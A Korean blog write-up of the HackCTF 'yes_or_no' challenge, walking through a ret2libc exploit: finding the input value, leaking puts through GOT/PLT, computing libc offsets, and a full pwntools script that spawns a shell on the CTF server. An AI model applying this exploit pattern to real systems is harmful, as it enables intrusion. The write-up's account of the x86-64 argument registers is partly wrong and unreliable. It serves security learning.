---
layout: post
title:  "HacCTF yes or no write-up"
date:   2020-01-08 19:45:55
image:  hackctfyesor.PNG
tags:   [Hackctf]
categories: [Write-up]
---
### 1.  문제

![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20yes_or_no/Untitled.png)

해당 문제에 걸려있는 보호기법들은 다음과 같다.

NX 비트가 걸려있기때문에 쉘코드 삽입을 이용한 실행은 불가능하다

![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20yes_or_no/Untitled%201.png)

![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20yes_or_no/Untitled%202.png)

프로그램을 실행시키면 다음과 같은 결과가 나온다. 입력하는 값에 따라 조금 다른 결과가 나오는데 아이다로 코드를 확인해보자.

    int __cdecl main(int argc, const char **argv, const char **envp)
    {
      int v3; // eax
      int v4; // eax
      int v5; // ecx
      int v6; // eax
      int v7; // eax
      char s; // [rsp+Eh] [rbp-12h]
      int v10; // [rsp+18h] [rbp-8h]
      int v11; // [rsp+1Ch] [rbp-4h]
    
      setvbuf(stdout, 0LL, 2, 0LL);
      v11 = 5;
      puts("Show me your number~!");
      **fgets(&s, 10, stdin);**
      v10 = atoi(&s);
      if ( (v11 - 10) >> 3 < 0 )
      {
        v4 = 0;
      }
      else
      {
        v3 = v11++;
        v4 = v10 - v3;
      }
      if ( v4 == v10 )
      {
        puts("Sorry. You can't come with us");
      }
      else
      {
        v5 = 1204 / ++v11;
        v6 = v11++;
        if ( v10 == (v6 * v5) << (++v11 % 20 + 5) )
        {
          puts("That's cool. Follow me");
          **gets(&s);**
        }
        else
        {
          v7 = v11--;
          if ( v10 == v7 )
          {
            printf("Why are you here?");
            return 0;
          }
          puts("All I can say to you is \"do_system+1094\".\ngood luck");
        }
      }
      return 0;
    }

초기에 fgets로 입력을 받고, 해당 입력 값이 특정 조건에 맞아야지만 gets 함수가 들어있는 조건문으로 분기하게 되고, 이때 gets를 이용한 bof가 일어날 것이다.

또한 문제에서 libc 파일을 제공해줬기 때문에, libc 주소를 이용하여 특정 라이브러리 주소를 leak을 한뒤, 오프셋을 가지고 system 함수를 실행시키면 될 것이다.

### 2. 접근방법

그렇다면, 다음의 순서로 접근을 하면 될 것 같다.

1. **gets함수가 실행되기 위한 알맞은 입력값 찾기**

    - **초반에 했던 작업**

        → 직접 조건문에 맞는 값이 계산하여 넣었다.

    - **다른 방법**

        →  gdb로 조건문 어셈블리 라인을 찾아가서 비교구문의 값 확인하기

        위의 아이다 코드를 보면 위에 두번의 puts함수가 나오고 그다음 조건문안에 puts 함수가 존재한다. 따라서 3번째 puts가 나오는 위치에서 cmp 를 찾는다

        ![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20yes_or_no/Untitled%203.png)

        main+237에 bp를 걸고 확인해보자

        ![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20yes_or_no/Untitled%204.png)

        eax값과 rbp-0x8 값을 비교하는데 여기서 우리가 필요한것은 eax값이다

        위에 레지스터 부분을 보면, rax가 0x960000인데 이것이 조건문에 만족하는 값이므로 첫번째 gets에서 입력할때 저 값을 입력해주면 된다. (10진수로 바꿔서)

2. gets함수로 라이브러리 주소 leak하기

    - 우선 왜 leak을 하냐?

        → ASLR때문에 libc base 주소가 계속 바뀐다. 따라서 라이브러리 주소들도 계속 바뀌긴 하지만 함수들 간, 베이스 주소간의 오프셋은 고정됨. 따라서 leak을 한 함수 주소 + 오프셋을 이용하여 원하는 라이브러리를 호출 할 수 있음

    - 내가 사용한 puts 함수 주소 leak 하기

        1. ROP Gadget 구하기 (pop rdi ; ret) (ret)

            <입력 : ROPgadget   —binary yes_or_no>

            ![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20yes_or_no/Untitled%205.png)

            - 0x400883 : pop rdi ; ret
            - 0x40056e : ret

        2. Puts 함수 Plt 주소 구하기

            ![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20yes_or_no/Untitled%206.png)

        3. Puts 함수 Got 주소 구하기

            ![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20yes_or_no/Untitled%207.png)

        4. 인자 정리
            - ret(pop rdi; ret) + puts_got + puts_plt 이렇게 입력하고 다시 메인으로 돌아가야함

3. 오프셋을 이용하여 system, /bin/sh 주소를 찾은 뒤 익스 
    - libc 주소 확인 (0x7ffff79e4000)

        ![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20yes_or_no/Untitled%208.png)

- puts와 system 주소 확인

![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20yes_or_no/Untitled%209.png)

- /bin/sh 위치 확인

    ![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20yes_or_no/Untitled%2010.png)

- 구한 값들을 이용해서 다음과 같이 페이로드를 작성하면 된다

    1.   libc_base : 0x00007ffff79e4000

    2.   puts : 0x7ffff7a649c0

    3.   system : 0x7ffff7a33440

    4.   /bin/sh : 0x7ffff7b97e9a

    5.   puts_offset(puts - libc_base) : 0x809c0

    6.   sys_offset(system - libc_base) : 0x4f440

    7.   bin_offset(/bin/sh - libc_base) : 0x1b3e9a

    8.   leak한 puts주소 - 0x809c0= y_libc_base

    9.   y_libc_base + 0x4f440= system 주소

    10. y_libc_base + 0x1b3e9a = /bin/sh/ 주소

### 3. 풀이

최종 익스 코드는 다음과 같다

    from pwn import *
    #context.log_level = "debug"
    
    p=remote("ctf.j0n9hyun.xyz",3009)
    #p=process("./yes_or_no")
    #gdb.attach(p)
    p.recvuntil("Show me your number~!\n")
    
    p.sendline("9830400")
    
    p.recvuntil("That's cool. Follow me\n")
    print('ss')
    
    #gatget
    pop_rdi = p64(0x0000000000400883)
    ret=p64(0x000000000040056e)
     
    ##
    puts_offset = 0x809c0
    sys_offset = 0x4f440
    bin_offset = 0x1b3e9a
    
    puts_got = p64(0x601018)
    puts_plt = p64(0x400580)
    main_got = p64(0x00000000004006c7)
    
    ###
    payload = "A"*26
    payload += pop_rdi
    payload += puts_got
    payload += puts_plt
    payload += main_got
    
    p.sendline(payload)
    
    puts_addr = p.recv(6)
    print(puts_addr)
    puts_addr += "\x00\x00"
    print(puts_addr)
    puts_addr = u64(puts_addr)
    
    log.info('leak = '+hex(puts_addr))
    p.recvuntil("Show me your number~!\n")
    
    p.sendline("9830400")
    
    p.recvuntil("That's cool. Follow me\n")
    
    libc_base_real = puts_addr-puts_offset
    
    system_addr = libc_base_real+sys_offset
    bin_sh_addr = libc_base_real+bin_offset
    
    print('system = '+hex(system_addr))
    #print(hex(bin_sh_addr))
    
    payload2 = "A"*26
    payload2 += pop_rdi
    payload2 += p64(bin_sh_addr)
    payload2 += ret
    payload2 += p64(system_addr)
    #raw_input('1')
    p.sendline(payload2)
    p.interactive()

### 4. 몰랐던 개념

이번 문제는 약간 시행착오가 많았다. 그렇기 때문에 얻게 된 것도 많았던 문제이다.

1. **movaps 어셈블리.**

    해당 어셈블리어 명령어는 기존 mov처럼 복사를 위한 명령어이긴 하지만 rsp 값이 16진수로 정렬이 되어있지 않으면 우분투 18.04 버전에서는 에러가 발행한다.

    따라서 익스코드에 밑에서 5번째 라인에서 ret를 넣어주어 rsp 값을 8증가시켜준 것이다 

    ![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20yes_or_no/Untitled%2011.png)

    payload += ret를 주석처리하고 gdb로 attach해서 확인을 해보면 do_system+1094 라인에서 movaps를 볼수가 있는데, rsp값이 현재 16배수가 아니므로 에러가 발생하는 걸 알 수 있다

2. **가젯**

    기존에는 32비트 환경에서 공부를 해왔는데, 함수의 인자가 들어가는 방식이 64비트 환경에서는 다르다는 것을 알게되었다.

    32비트는 call하기전 필요한 인자값들을 스택에 push를 하는데

    64비트에서는 인자값을 레지스터에 넣는데, 만약 인자가 7개를 넘어갈시 초과되는 인자값들만 스택에 넣게 된다.

    ![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20yes_or_no/Untitled%2012.png)

    ex) 함수(1,2,3,4,5,6,7)

    이렇게 되면 7부터 rdi 레지스터에 들어간다. 나머지도 순서대로 레지스터에 들어간다

    따라서 puts 함수를 leak하기 위해 ret 주소에 pop rdi; ret를 넣어준 것이다.

3. **오프셋**

    ASLR을 우회하기 위해 libc base 주소를 기반으로 오프셋을 이용하여 다른 함수 주소를 구하는 것이 이해가 잘안갔는데, 이번 문제를 풀면서 많이 이해가 되었다.